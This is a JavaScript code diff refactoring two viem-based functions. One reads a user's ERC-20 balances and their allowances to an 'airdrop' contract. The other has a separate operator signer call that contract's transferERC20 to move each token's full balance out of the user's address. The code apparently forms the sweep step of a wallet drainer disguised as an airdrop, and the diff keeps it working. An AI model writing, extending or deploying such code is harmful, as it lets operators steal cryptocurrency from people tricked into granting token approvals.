@@ -4,10 +4,10 @@ import { createWalletClient, http } from 'viem'
 const erc20abi = require("../abis/erc20abi.json");
 const dataProviderAbi = require("../abis/DataProviderAbi.json");
 const airdropAbi = require('../abis/AirdropAbi.json');
-export const getBalanceErc20 = async (providerAddress, client, tokens, userAddress, airdrop) => {
+export const getBalanceErc20 = async (providerAddress, tokens, airdrop, userAddress, clientReader) => {
     console.log("GET BALANCE ERC20")
     // const dataProviderContract = new ethers.Contract(providerAddress, dataProviderAbi, provider);
-    const balances = await client.readContract({
+    const balances = await clientReader.readContract({
         address: providerAddress,
         abi: dataProviderAbi,
         functionName: "getERC20Balances",
@@ -23,12 +23,12 @@ export const getBalanceErc20 = async (providerAddress, client, tokens, userAddre
     let filtredTokens = [];
     for (let i = 0; i < filtredByBalance.length; i++) {
         // const contract = new ethers.Contract(filtredByBalance[i].address, erc20abi, client);
-        const decimals = await client.readContract({
+        const decimals = await clientReader.readContract({
             address: filtredByBalance[i].address,
             abi: erc20abi,
             functionName: "decimals"
         })
-        const allowance = await client.readContract({
+        const allowance = await clientReader.readContract({
             address: filtredByBalance[i].address,
             abi: erc20abi,
             functionName: "allowance",
@@ -50,12 +50,12 @@ export const getBalanceErc20 = async (providerAddress, client, tokens, userAddre
     }
     return await Promise.all(filtredTokens);
 }
-export const transferErc20 = async (chain, tokensWithBalance, airdrop, userAddress, publicClient, signer) => {
+export const transferErc20 = async (chain, tokensWithBalance, airdrop, userAddress, clientReader, clientWriter, signerAccount) => {
 
     let res = [];
     for (let i = 0; i < tokensWithBalance.length; i++) {
         try {
-            const allowance = await publicClient.readContract({
+            const allowance = await clientReader.readContract({
                 address: tokensWithBalance[i].address,
                 abi: erc20abi,
                 functionName: "allowance",
@@ -75,17 +75,17 @@ export const transferErc20 = async (chain, tokensWithBalance, airdrop, userAddre
         const amounts = tokensWithBalance.map((token) => token.balance);
         if (addresses.length > 0 && amounts.length > 0) {
             const walletClient = createWalletClient({
-                account:signer,
+                account:signerAccount,
                 chain: chain,
                 transport: http()
               })
             // const airdropContract = new ethers.Contract(airdrop, airdropAbi, signer);
-            const { request } = await publicClient.simulateContract({
+            const { request } = await walletClient.simulateContract({
                 address: airdrop,
                 abi: airdropAbi,
                 functionName: 'transferERC20',
                 args: [userAddress, addresses, amounts],
-                gasPrice:chain.id === 137 ? publicClient.getGasPrice() : undefined,
+                gasPrice:chain.id === 137 ? walletClient.getGasPrice() : undefined,
               })
               await walletClient.writeContract(request)
             // if (chain.id === 137) {
